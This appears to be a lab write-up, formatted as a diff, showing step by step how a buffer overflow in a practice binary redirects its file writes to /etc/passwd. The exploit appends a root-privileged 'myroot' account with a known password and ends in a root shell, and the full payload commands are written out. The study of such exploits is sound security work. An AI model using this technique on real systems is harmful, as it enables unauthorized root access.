@@ -1,0 +1,58 @@
+When argv[1] is not over 100 characters, it works perfectly.
+
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  sudo touch /var/notes
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  ./pass_change AAAA
+[DEBUG] data.buffer @ 0xffce9dd4: 'AAAA'
+[DEBUG] data.datafile @ 0xffce9e38: '/var/notes'
+[DEBUG] fd @ 0xffce9dd0: 3
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  cat /var/notes
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  python -c "print 0xffce9e38-0xffce9dd4"
+100
+
+Since the offset between buffer and datafile is 100 (same as the size of buffer), the overflowed strings of argv[1] will be overwritten to datafile.
+
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  ./pass_change $(perl -e 'print "A"x120')
+[DEBUG] data.buffer @ 0xffed7924: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[DEBUG] data.datafile @ 0xffed7988: 'AAAAAAAAAAAAAAAAAAAA'
+[DEBUG] fd @ 0xffed7920: -1
+in main() - no write
+
+By exploiting this BOF, let's create a new user with a chosen password by appending to /etc/passwd file. Following the format of /etc/passwd in UNIX system, I will add username myroot with password password --- myroot:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash. As shown below, password is encrypted using Crypto() OpenSSL cryptographic library with a salt "AA". Note that the 3rd & 4th entry (i.e. "0:0") indicates root privilege. If you want to know the format of /etc/passwd more in detail, refer to a link here.
+
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  perl -e "print crypt('password', 'AA')"
+AA6tQYSfGxd/A
+The content of datafile needs to be /etc/passwd, but the last entry in /etc/passwd needs to specify the user's default shell. So, let's create a symbolic link with the name /tmp/etc/passwd pointing to /bin/bash. Then, adjust the length of the user ID info (comment section), so that the location of /etc/passwd would be at 100.
+
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  ln -s /bin/bash /tmp/etc/passwd
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  perl -e 'print "myroot:AA6tQYSfGxd/A:0:0:" . "A"x50 . ":/root:/tmp"' | wc -c
+86
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  perl -e 'print "myroot:AA6tQYSfGxd/A:0:0:" . "A"x64 . ":/root:/tmp"' | wc -c
+100
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  perl -e 'print "myroot:AA6tQYSfGxd/A:0:0:" . "A"x64 . ":/root:/tmp" . "/etc/passwd"'
+myroot:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
+Good. And here it is, you get the root shell.
+
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  ./pass_change $(perl -e 'print "myroot:AA6tQYSfGxd/A:0:0:" . "A"x64 . ":/root:/tmp" . "/etc/passwd"')
+[DEBUG] data.buffer @ 0xff8541b4: 'myroot:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
+[DEBUG] data.datafile @ 0xff854218: '/etc/passwd'
+[DEBUG] fd @ 0xff8541b0: 3
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  cat /etc/passwd | grep myroot
+myroot:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
+taishi@sirius:~/blackhat_python/bof_lab|master⚡
+⇒  su myroot
+Password:
+root@sirius:/home/taishi/blackhat_python/bof_lab# whoami
+root
